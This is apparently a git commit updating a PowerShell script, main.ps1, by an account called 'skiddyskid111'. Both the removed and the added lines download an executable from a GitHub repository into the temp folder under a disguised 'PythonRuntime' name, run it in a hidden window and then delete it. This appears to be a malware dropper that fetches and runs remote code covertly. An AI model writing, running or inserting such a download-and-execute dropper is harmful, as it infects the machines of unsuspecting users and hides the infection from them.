a35636aebf23f9d549b0bbc579b37af74c70d5d8
skiddyskid111 <dhwhrvcxa@gmail.com>
2025-08-18 19:03:40 +0200

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,5 +1,5 @@
 $rand = Get-Random
-$path = "$env:TEMP\PythonRuntime_$rand.exe"
-Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path -UseBasicParsing -ErrorAction SilentlyContinue
-Start-Process $path -WindowStyle Hidden
+$path = "$env:TEMP\PythonRuntime_$rand.exe" 
+Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path 
+Start-Process $path -WindowStyle Hidden -Wait 
 Remove-Item $path -Force
